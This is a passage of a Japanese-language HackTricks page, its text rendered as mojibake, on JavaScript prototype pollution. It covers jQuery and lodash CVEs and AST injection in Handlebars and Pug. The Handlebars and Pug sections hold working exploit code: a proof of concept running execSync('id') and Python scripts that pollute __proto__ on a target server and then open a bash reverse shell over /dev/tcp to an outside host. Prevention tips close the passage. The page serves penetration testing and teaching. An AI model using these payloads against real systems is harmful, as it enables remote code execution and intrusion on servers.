`myObject`ãŒãƒ¦ãƒ¼ã‚¶ãƒ¼ã‹ã‚‰ã®å…¥åŠ›ãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ã§ã‚ã‚Šã€DBã«ã‚·ãƒªã‚¢ãƒ«åŒ–ã•ã‚Œã‚‹ã¨æƒ³åƒã§ãã¾ã™ï¼‰

ã“ã®ã‚³ãƒ¼ãƒ‰ã§ã¯ã€å®Ÿè¡Œæ™‚ã«`isAdmin`å±æ€§ãŒæ–°ã—ãä½œæˆã•ã‚ŒãŸã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã«å‰²ã‚Šå½“ã¦ã‚‰ã‚Œã‚‹ã¨æ€ã‚ã‚ŒãŒã¡ã§ã™ã€‚ã—ã‹ã—ã€å®Ÿéš›ã«ã¯ã€ãã‚Œã¯ç›´æ¥`{}`ã«å‰²ã‚Šå½“ã¦ã‚‰ã‚Œã€ãã®å¾Œ`{}.isAdmin`ã¯`true`ã«ãªã‚Šã¾ã™ã€‚ã“ã®ã‚³ãƒ¼ãƒ‰ã®å¾Œã«ã€ä»¥ä¸‹ã®ãƒã‚§ãƒƒã‚¯ã‚’å®Ÿè¡Œã™ã‚‹ã¨ã—ã¾ã™ï¼š
```javascript
If (user.isAdmin === true) {
// do something for admin
}
```
ã‚‚ã—ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒã¾ã å­˜åœ¨ã—ã¦ã„ãªã„å ´åˆï¼ˆ `undefined` ï¼‰ã€`isAdmin` ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã¯ãã®è¦ªã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã§æ¤œç´¢ã•ã‚Œã¾ã™ã€‚è¦ªã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã«ã¯ã€ä¸Šè¨˜ã§å€¤ãŒ `true` ã® `isAdmin` ãŒè¿½åŠ ã•ã‚Œã¦ã„ã¾ã™ã€‚

JQuery 3.3.1 ã§å®Ÿè¡Œã—ãŸå ´åˆã®åˆ¥ã®ä¾‹ï¼š
```javascript
$.extend(true, {}, JSON.parse('{"__proto__": {"devMode": true}}'))
console.log({}.devMode); // true
```
ã“ã‚Œã‚‰ã®ã‚¨ãƒ©ãƒ¼ã¯ã€ç‰¹ã«NodeJSãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã«å¤šå¤§ãªå½±éŸ¿ã‚’ä¸ãˆã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚æœ€ã‚‚å®Ÿç”¨çš„ãªä¾‹ã¯ã€2018å¹´12æœˆã«Mongooseã§ç™ºç”Ÿã—ãŸã‚¨ãƒ©ãƒ¼ã§ã™ã€‚Mongooseã¯ã€MongoDBã‚’æ“ä½œã™ã‚‹ã®ã«å½¹ç«‹ã¤JSãƒ©ã‚¤ãƒ–ãƒ©ãƒªã§ã€åºƒãä½¿ã‚ã‚Œã¦ã„ã¾ã™ã€‚

### CVE-2018â€“3721ã€CVE-2019â€“10744: lodashã‚’ä»‹ã—ãŸãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—æ±šæŸ“æ”»æ’ƒ

[Lodash](https://www.npmjs.com/package/lodash)ã‚‚ã‚ˆãçŸ¥ã‚‰ã‚ŒãŸãƒ©ã‚¤ãƒ–ãƒ©ãƒªã§ã€ã•ã¾ã–ã¾ãªé–¢æ•°ã‚’æä¾›ã—ã¦ãŠã‚Šã€é€±ã«1900ä¸‡å›ä»¥ä¸Šãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã•ã‚Œã¦ã„ã¾ã™ã€‚ãã—ã¦ã€JQueryã¨åŒã˜å•é¡ŒãŒã‚ã‚Šã¾ã™ã€‚

**CVE-2018â€“3721**

**CVE-2019â€“10744**

ã“ã®ãƒã‚°ã¯ã€Lodashã®ã™ã¹ã¦ã®ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«å½±éŸ¿ã‚’ä¸ãˆã¾ã™ãŒã€ãƒãƒ¼ã‚¸ãƒ§ãƒ³4.17.11ã§ä¿®æ­£ã•ã‚Œã¦ã„ã¾ã™ã€‚

### ä»–ã®CVEã‚’å«ã‚€ãƒãƒ¥ãƒ¼ãƒˆãƒªã‚¢ãƒ«

{% embed url="https://infosecwriteups.com/javascript-prototype-pollution-practice-of-finding-and-exploitation-f97284333b2" %}

## ASTãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—æ±šæŸ“

NodeJSã§ã¯ã€ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚¨ãƒ³ã‚¸ãƒ³ã‚„TypeScriptãªã©ã§ASTãŒé »ç¹ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚

ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚¨ãƒ³ã‚¸ãƒ³ã®å ´åˆã€æ§‹é€ ã¯ä¸Šè¨˜ã®ã‚ˆã†ã«ãªã‚Šã¾ã™ã€‚

![img](https://blog.p6.is/img/2020/08/graph\_3.jpg)

### Handlebars

æƒ…å ±ã¯[https://blog.p6.is/AST-Injection/](https://blog.p6.is/AST-Injection/)ã‹ã‚‰å–å¾—ã—ã¾ã—ãŸã€‚

`Object.prototype.pendingContent`ã«ä»»æ„ã®æ–‡å­—åˆ—ã‚’æŒ¿å…¥ã™ã‚‹ã“ã¨ã§ã€æ”»æ’ƒã®å¯èƒ½æ€§ã‚’åˆ¤æ–­ã§ãã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€ãƒ–ãƒ©ãƒƒã‚¯ãƒœãƒƒã‚¯ã‚¹ç’°å¢ƒã§ãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—æ±šæŸ“ãŒå­˜åœ¨ã™ã‚‹å ´åˆã«ã€ã‚µãƒ¼ãƒãƒ¼ãŒHandlebarsã‚¨ãƒ³ã‚¸ãƒ³ã‚’ä½¿ç”¨ã—ã¦ã„ã‚‹ã“ã¨ã‚’ç¢ºèªã§ãã¾ã™ã€‚
```javascript
<!-- /node_modules/handlebars/dist/cjs/handlebars/compiler/javascript-compiler.js -->

...
appendContent: function appendContent(content) {
if (this.pendingContent) {
content = this.pendingContent + content;
} else {
this.pendingLocation = this.source.currentLocation;
}

this.pendingContent = content;
},
pushSource: function pushSource(source) {
if (this.pendingContent) {
this.source.push(this.appendToBuffer(this.source.quotedString(this.pendingContent), this.pendingLocation));
this.pendingContent = undefined;
}

if (source) {
this.source.push(source);
}
}
...
```
ã“ã‚Œã¯ã€`javascript-compiler.js`ã®`appendContent`é–¢æ•°ã«ã‚ˆã£ã¦è¡Œã‚ã‚Œã¾ã™ã€‚\
`appendContent`ã¯æ¬¡ã®ã‚ˆã†ã«ãªã‚Šã¾ã™ã€‚`pendingContent`ãŒå­˜åœ¨ã™ã‚‹å ´åˆã€ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã«è¿½åŠ ã—ã¦è¿”ã—ã¾ã™ã€‚

`pushSource`ã¯`pendingContent`ã‚’`undefined`ã«ã—ã€æ–‡å­—åˆ—ãŒè¤‡æ•°å›æŒ¿å…¥ã•ã‚Œã‚‹ã®ã‚’é˜²ãã¾ã™ã€‚

**æ”»æ’ƒæ‰‹æ³•**

![img](https://blog.p6.is/img/2020/08/graph\_5.jpg)

Handlebarsã¯ä¸Šè¨˜ã®ã‚°ãƒ©ãƒ•ã®ã‚ˆã†ã«æ©Ÿèƒ½ã—ã¾ã™ã€‚

ãƒ¬ã‚­ã‚µãƒ¼ã¨ãƒ‘ãƒ¼ã‚µãƒ¼ãŒASTã‚’ç”Ÿæˆã—ãŸå¾Œã€ãã‚Œã¯`compiler.js`ã«æ¸¡ã•ã‚Œã¾ã™ã€‚\
ç”Ÿæˆã•ã‚ŒãŸãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆé–¢æ•°ã‚’ã„ãã¤ã‹ã®å¼•æ•°ã¨å…±ã«å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã€ãã‚Œã¯ã€ŒHello posixã€ã¨ã„ã†æ–‡å­—åˆ—ã‚’è¿”ã—ã¾ã™ï¼ˆmsgãŒposixã®å ´åˆï¼‰ã€‚
```javascript
<!-- /node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js -->

case 36:
this.$ = { type: 'NumberLiteral', value: Number($$[$0]), original: Number($$[$0]), loc: yy.locInfo(this._$) };
break;
```
handlebarsã®ãƒ‘ãƒ¼ã‚µãƒ¼ã¯ã€NumberLiteralå‹ã®ãƒãƒ¼ãƒ‰ã®å€¤ã‚’å¸¸ã«Numberã‚³ãƒ³ã‚¹ãƒˆãƒ©ã‚¯ã‚¿ãƒ¼ã‚’é€šã˜ã¦æ•°å€¤ã«å¼·åˆ¶ã—ã¾ã™ã€‚ã—ã‹ã—ã€ãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—æ±šæŸ“ã‚’ä½¿ç”¨ã—ã¦ã€ã“ã“ã«éæ•°å€¤ã®æ–‡å­—åˆ—ã‚’æŒ¿å…¥ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```javascript
<!-- /node_modules/handlebars/dist/cjs/handlebars/compiler/base.js -->

function parseWithoutProcessing(input, options) {
// Just return if an already-compiled AST was passed in.
if (input.type === 'Program') {
return input;
}

_parser2['default'].yy = yy;

// Altering the shared object here, but this is ok as parser is a sync operation
yy.locInfo = function (locInfo) {
return new yy.SourceLocation(options && options.srcName, locInfo);
};

var ast = _parser2['default'].parse(input);

return ast;
}

function parse(input, options) {
var ast = parseWithoutProcessing(input, options);
var strip = new _whitespaceControl2['default'](options);

return strip.accept(ast);
}
```
æœ€åˆã«ã€compileé–¢æ•°ã‚’è¦‹ã¦ã¿ã¾ã—ã‚‡ã†ã€‚ã“ã®é–¢æ•°ã¯ã€ASTã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã¨ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆæ–‡å­—åˆ—ã®2ã¤ã®å…¥åŠ›æ–¹æ³•ã‚’ã‚µãƒãƒ¼ãƒˆã—ã¦ã„ã¾ã™ã€‚

ã‚‚ã—input.typeãŒ`Program`ã§ã‚ã‚‹å ´åˆã€å®Ÿéš›ã®å…¥åŠ›å€¤ã¯æ–‡å­—åˆ—ã§ã™ãŒã€ãƒ‘ãƒ¼ã‚µãƒ¼ã¯ãã‚Œã‚’parser.jsã«ã‚ˆã£ã¦ã™ã§ã«ASTã«ãƒ‘ãƒ¼ã‚¹ã•ã‚ŒãŸã‚‚ã®ã¨è¦‹ãªã—ã€ä½•ã®å‡¦ç†ã‚‚ã›ãšã«ã‚³ãƒ³ãƒ‘ã‚¤ãƒ©ã«é€ã‚Šã¾ã™ã€‚
```javascript
<!-- /node_modules/handlebars/dist/cjs/handlebars/compiler/compiler.js -->

...
accept: function accept(node) {
/* istanbul ignore next: Sanity code */
if (!this[node.type]) {
throw new _exception2['default']('Unknown type: ' + node.type, node);
}

this.sourceNode.unshift(node);
var ret = this[node.type](node);
this.sourceNode.shift();
return ret;
},
Program: function Program(program) {
console.log((new Error).stack)
this.options.blockParams.unshift(program.blockParams);

var body = program.body,
bodyLength = body.length;
for (var i = 0; i < bodyLength; i++) {
this.accept(body[i]);
}

this.options.blockParams.shift();

this.isSimple = bodyLength === 1;
this.blockParams = program.blockParams ? program.blockParams.length : 0;

return this;
}
```
ã‚³ãƒ³ãƒ‘ã‚¤ãƒ©ã¯ASTã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆï¼ˆå®Ÿéš›ã«ã¯æ–‡å­—åˆ—ï¼‰ã‚’å—ã‘å–ã‚Šã€`accept`ãƒ¡ã‚½ãƒƒãƒ‰ã«é€ã‚Šã¾ã™ã€‚ãã—ã¦ã€`accept`ã¯ã‚³ãƒ³ãƒ‘ã‚¤ãƒ©ã®`this[node.type]`ã‚’å‘¼ã³å‡ºã—ã¾ã™ã€‚æ¬¡ã«ã€ASTã®bodyå±æ€§ã‚’å–å¾—ã—ã€ãã‚Œã‚’é–¢æ•°ã®æ§‹ç¯‰ã«ä½¿ç”¨ã—ã¾ã™ã€‚
```javascript
const Handlebars = require('handlebars');

Object.prototype.type = 'Program';
Object.prototype.body = [{
"type": "MustacheStatement",
"path": 0,
"params": [{
"type": "NumberLiteral",
"value": "console.log(process.mainModule.require('child_process').execSync('id').toString())"
}],
"loc": {
"start": 0,
"end": 0
}
}];


const source = `Hello {{ msg }}`;
const template = Handlebars.precompile(source);

console.log(eval('(' + template + ')')['main'].toString());

/*
function (container, depth0, helpers, partials, data) {
var stack1, lookupProperty = container.lookupProperty || function (parent, propertyName) {
if (Object.prototype.hasOwnProperty.call(parent, propertyName)) {
return parent[propertyName];
}
return undefined
};

return ((stack1 = (lookupProperty(helpers, "undefined") || (depth0 && lookupProperty(depth0, "undefined")) || container.hooks.helperMissing).call(depth0 != null ? depth0 : (container.nullContext || {}), console.log(process.mainModule.require('child_process').execSync('id').toString()), {
"name": "undefined",
"hash": {},
"data": data,
"loc": {
"start": 0,
"end": 0
}
})) != null ? stack1 : "");
}
*/
```
ä»¥ä¸‹ã®ã‚ˆã†ã«æ”»æ’ƒã‚’è¨­å®šã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ãƒ‘ãƒ¼ã‚µãƒ¼ã‚’é€šéã—ãŸå ´åˆã€NumberLiteralã®å€¤ã«å‰²ã‚Šå½“ã¦ã‚‹ã“ã¨ãŒã§ããªã„æ–‡å­—åˆ—ã‚’æŒ‡å®šã—ã¾ã™ã€‚ã—ã‹ã—ã€æ³¨å…¥ã•ã‚ŒãŸASTãŒå‡¦ç†ã•ã‚Œã‚‹ã¨ã€ä»»æ„ã®ã‚³ãƒ¼ãƒ‰ã‚’é–¢æ•°ã«æŒ¿å…¥ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

**ä¾‹**

[https://github.com/hughsk/flat/issues/105](https://github.com/hughsk/flat/issues/105)
```python
import requests

TARGET_URL = 'http://p6.is:3000'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
"__proto__.type": "Program",
"__proto__.body": [{
"type": "MustacheStatement",
"path": 0,
"params": [{
"type": "NumberLiteral",
"value": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
}],
"loc": {
"start": 0,
"end": 0
}
}]
})

# execute
requests.get(TARGET_URL)
```
### Pug

è©³ç´°ã¯[https://blog.p6.is/AST-Injection/#Pug](https://blog.p6.is/AST-Injection/#Pug)ã‚’å‚ç…§ã—ã¦ãã ã•ã„ã€‚
```python
import requests

TARGET_URL = 'http://p6.is:3000'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
"__proto__.block": {
"type": "Text",
"line": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
}
})

# execute
requests.get(TARGET_URL)
```
## ã©ã†ã™ã‚Œã°äºˆé˜²ã§ãã‚‹ã®ã‹ï¼Ÿ

* `Object.freeze (Object.prototype)`ã‚’ä½¿ç”¨ã—ã¦ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã‚’å‡çµã™ã‚‹
* ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®ã‚¹ã‚­ãƒ¼ãƒã«å¾“ã£ã¦JSONå…¥åŠ›ã‚’æ¤œè¨¼ã™ã‚‹
* å®‰å…¨ã§ãªã„æ–¹æ³•ã§å†å¸°çš„ãªãƒãƒ¼ã‚¸é–¢æ•°ã‚’ä½¿ç”¨ã—ãªã„
* ãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—ãƒã‚§ãƒ¼ãƒ³ã«å½±éŸ¿ã‚’ä¸ãˆãªã„ã‚ˆã†ã«ã€`Object.create(null)`ãªã©ã®ãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã®ãªã„ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’ä½¿ç”¨ã™ã‚‹
* `Object`ã®ä»£ã‚ã‚Šã«`Map`ã‚’ä½¿ç”¨ã™ã‚‹
* å®šæœŸçš„ã«ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã®æ–°ã—ã„ãƒ‘ãƒƒãƒã‚’æ›´æ–°ã™ã‚‹

## å‚è€ƒ

* [https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)
* [https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l](https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l)
* [https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼æ¥­ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ** **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**PEASSã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã‚’å…¥æ‰‹**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã¾ã—ã‚‡ã†ã€ç§ãŸã¡ã®ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³
* [**å…¬å¼ã®PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„ã€‚
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ã¨** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ã«PRã‚’æå‡º**ã—ã¦ãã ã•ã„ã€‚

</details>
